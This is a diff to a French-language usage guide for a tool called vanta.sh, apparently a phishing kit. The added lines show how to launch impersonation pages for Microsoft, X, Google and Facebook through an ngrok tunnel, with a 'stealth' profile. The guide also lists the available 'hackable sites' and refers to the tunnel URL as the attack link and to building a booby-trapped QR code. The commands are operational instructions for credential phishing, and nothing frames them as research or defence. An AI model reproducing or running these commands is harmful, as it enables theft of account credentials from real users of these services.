@@ -179,8 +179,18 @@ La structure est toujours : `./vanta.sh [ACTION] [OPTIONS]`
 ```bash
 ./vanta.sh edge-run --name microsoft --tunnel ngrok --profile stealth
 ```
-1.  Attendez que l'URL `https://xxxx.ngrok-free.app` apparaisse.
-2.  C'est votre lien d'attaque.
+
+### 🔄 Comment changer de cible (Google, X, Facebook...) ?
+C'est très simple : il suffit de remplacer `microsoft` par le nom du service que vous voulez attaquer.
+*   Pour **X (Twitter)** : `./vanta.sh edge-run --name x --tunnel ngrok`
+*   Pour **Google** : `./vanta.sh edge-run --name google --tunnel ngrok`
+*   Pour **Facebook** : `./vanta.sh edge-run --name facebook --tunnel ngrok`
+
+💡 **Astuce :** Pour voir la liste de tous les sites piratables disponibles, lancez :
+```bash
+./vanta.sh phishlets-list
+```
+Cela vous donnera les noms exacts à utiliser après `--name`.
 
 ### Créer un QR Code Piégé
 Dans un **nouveau terminal** :
